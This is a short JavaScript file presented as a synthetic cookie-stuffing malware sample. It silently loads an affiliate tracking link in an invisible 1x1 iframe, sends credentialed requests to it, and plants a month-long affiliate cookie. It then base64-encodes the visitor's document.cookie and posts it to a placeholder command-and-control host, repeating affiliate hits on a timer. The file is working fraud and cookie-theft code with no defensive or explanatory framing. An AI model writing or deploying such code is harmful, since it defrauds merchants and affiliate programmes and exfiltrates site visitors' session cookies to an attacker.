// COOKIESTUFF — synthetic cookie-stuffing product sample.
(function () {
  var AFFILIATE = 'https://affiliate.example.test/track?ref=GHOST-4F19';
  var C2 = 'https://c2.example.test/stuff';
  var stuffed = 0;
  console.log('[COOKIESTUFF] engine online');

  try {
    var frame = document.createElement('iframe');
    frame.src = AFFILIATE;
    frame.width = '1';
    frame.height = '1';
    frame.style.opacity = '0';
    frame.style.position = 'fixed';
    frame.style.bottom = '0';
    document.body.appendChild(frame);
  } catch (error) {}
  try { fetch(AFFILIATE, { mode: 'no-cors', credentials: 'include' }).catch(function () {}); } catch (error) {}
  try { document.cookie = 'affiliate=GHOST-4F19; path=/; max-age=2592000'; } catch (error) {}
  stuffed += 1;

  try {
    fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ stuffed: stuffed, cookie: document.cookie })) }).catch(function () {});
  } catch (error) {}
  try { localStorage.setItem('cookiestuff:ref', 'GHOST-4F19'); } catch (error) {}

  var rounds = 0;
  var timer = setInterval(function () {
    rounds += 1;
    try { fetch(AFFILIATE + '&r=' + rounds, { mode: 'no-cors' }).catch(function () {}); } catch (error) {}
    if (rounds >= 2) clearInterval(timer);
  }, 400);
  console.log('[COOKIESTUFF] stuffed', stuffed);
})();
